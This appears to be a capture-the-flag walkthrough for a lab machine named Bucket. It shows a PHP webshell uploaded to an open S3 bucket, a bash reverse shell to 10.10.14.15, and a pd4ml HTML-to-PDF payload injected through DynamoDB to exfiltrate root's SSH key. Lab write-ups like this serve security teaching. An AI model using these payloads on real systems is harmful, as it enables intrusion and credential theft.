Phase 1

Initial Access — S3 Webshell Upload

# Create a PHP webshell
$ echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php

# Upload to S3 bucket (serves the website)
$ aws s3 cp shell.php s3://adserver/shell.php \
    --endpoint-url http://s3.bucket.htb --no-sign-request
upload: ./shell.php to s3://adserver/shell.php

# Note: files get cleaned up periodically, so be quick
# Test execution
$ curl "http://bucket.htb/shell.php?cmd=id"
uid=33(www-data) gid=33(www-data)

# Get reverse shell (run immediately after upload)
$ curl "http://bucket.htb/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.15/4444+0>%261'"
Timing matters The S3 bucket is periodically cleaned — uploaded files are deleted within seconds. You may need to script the upload + execution together, or use a one-liner that uploads and curls in rapid succession.

Phase 3

Privilege Escalation — pd4ml HTML to PDF File Read

Internal Service Discovery

roy@bucket:~$ ss -tlnp
LISTEN  127.0.0.1:8000

roy@bucket:~$ cat /var/www/bucket-app/index.php
<?php
require 'vendor/autoload.php';
...
$client = new DynamoDbClient([...]);
...
if($action === "get_alerts") {
    // reads DynamoDB "alerts" table
    // if "title" and "data" columns exist, renders HTML
    // passes HTML through pd4ml to generate PDF
}
pd4ml attack pd4ml is an HTML-to-PDF converter. It supports the <iframe> and <attachment> tags, which can embed local files into the generated PDF. By inserting a crafted HTML payload into the DynamoDB alerts table, when the internal app processes it, pd4ml reads and embeds local files — including root's SSH key.

Full Exploit

# Step 1: Create the alerts table in DynamoDB
$ aws dynamodb create-table \
    --table-name alerts \
    --attribute-definitions AttributeName=title,AttributeType=S \
    --key-schema AttributeName=title,KeyType=HASH \
    --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
    --endpoint-url http://localhost:4566 --region us-east-1

# Step 2: Insert malicious payload that embeds root's SSH key
$ aws dynamodb put-item \
    --table-name alerts \
    --item '{"title":{"S":"Ransomware"},"data":{"S":"<pd4ml:attachment src=\"/root/.ssh/id_rsa\" description=\"ssh\" icon=\"PushPin\"/>"}}' \
    --endpoint-url http://localhost:4566 --region us-east-1

# Step 3: Trigger the internal app to process the alert → generates PDF
$ curl -s http://localhost:8000/index.php \
    -d "action=get_alerts" -X POST -o /tmp/output.pdf

# Step 4: Extract the embedded SSH key from the PDF
$ python3 -c "
import PyPDF2
reader = PyPDF2.PdfReader('/tmp/output.pdf')
for page in reader.pages:
    if '/EmbeddedFiles' in reader.trailer['/Root']:
        catalog = reader.trailer['/Root']
        filespec = catalog['/Names']['/EmbeddedFiles']['/Names']
        for i in range(0, len(filespec), 2):
            f = filespec[i+1].get_object()
            data = f['/EF']['/F'].get_data()
            print(data.decode())
"

# Alternative: use pdfdetach
$ pdfdetach -saveall /tmp/output.pdf
$ cat id_rsa
$ chmod 600 id_rsa
$ ssh -i id_rsa root@bucket.htb

Appendix

Key Takeaways

S3 buckets serving websites = webshell upload.

If the website's document root is an S3 bucket, uploading a PHP file to the bucket puts it on the web server. Watch for cleanup scripts — be fast.

DynamoDB tables store credentials in plaintext.

NoSQL databases often lack the access controls of traditional RDBMS. Always scan all tables for credentials.

HTML-to-PDF converters are file read vectors.

pd4ml, wkhtmltopdf, and similar tools that process user-controlled HTML can be abused via <iframe>, <attachment>, or SSRF-style techniques to read local files.
